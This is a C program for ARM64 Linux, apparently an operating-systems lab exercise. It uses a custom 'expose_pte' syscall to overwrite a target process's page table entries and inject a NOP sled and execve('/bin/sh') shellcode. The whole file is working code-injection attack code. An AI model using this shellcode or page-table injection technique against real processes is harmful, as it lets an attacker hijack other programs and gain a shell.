#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

struct expose_pte_args {
    pid_t pid;

    unsigned long begin_fpt_vaddr;
    unsigned long end_fpt_vaddr;

    unsigned long begin_pte_vaddr;
    unsigned long end_pte_vaddr;

    unsigned long begin_vaddr;
    unsigned long end_vaddr;
};

extern void shellcode();
__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0");

unsigned long *expose_pte_single (pid_t pid, unsigned long vaddr) {
    struct expose_pte_args ep_args;
    unsigned long begin_vaddr, end_vaddr;
    void *ptep;
    unsigned long *fpt;

    begin_vaddr = vaddr - (vaddr & ((1 << 21) - 1));
    end_vaddr   = begin_vaddr + (1 << 21);

    ptep = mmap(NULL, 1 << 12, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (!ptep) {
        printf("allocate error.\n");
        exit(-1);
    }
    ep_args = (struct expose_pte_args) {
        .pid             = pid,
        .begin_fpt_vaddr = (unsigned long)(&fpt),
        .end_fpt_vaddr   = (unsigned long)(&fpt + 1),
        .begin_pte_vaddr = (unsigned long)(ptep),
        .end_pte_vaddr   = (unsigned long)(ptep + (1 << 12)),
        .begin_vaddr     = begin_vaddr,
        .end_vaddr       = end_vaddr,
    };
    if (syscall(436, &ep_args) || (fpt != ptep)) {
        printf("expose pte fail.\n");
        exit(-1);
    }

    return ptep;
}

int main (int argc, char* argv[]) {
    int i;
    void *sc;
    unsigned long pte_nop, pte_sc;
    unsigned long *ptep;

    // Check arguments
    if (argc != 2) {
        printf("Usage %s sheep_pid\n", argv[0]);
        return -1;
    }

    // Prepare shellcode
    sc = mmap(NULL, 2 << 12, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (!sc) {
        printf("allocate error.\n");
        return -1;
    }
    for (i = 0; i < 1 << 10; i++)              // page1, nop
        ((int*)sc)[i] = 0xd503201f;            // nop opcode
    memcpy(sc + (1 << 12), &shellcode, 0x100); // page2, shellcode

    // Expose shellcode's pte
    ptep = expose_pte_single(getpid(), (unsigned long)sc);
    pte_nop = ptep[(((unsigned long)sc >> 12) & ((1 << 9) - 1))];
    pte_sc  = ptep[(((unsigned long)sc >> 12) & ((1 << 9) - 1)) + 1];

    // Expose sheep's pte
    ptep = expose_pte_single(atoi(argv[1]), 0x400000);

    // Code injection
    ptep[511] = pte_sc;
    for (i = 0; i < 511; ++i)
        ptep[i] = pte_nop;

    return 0;
}
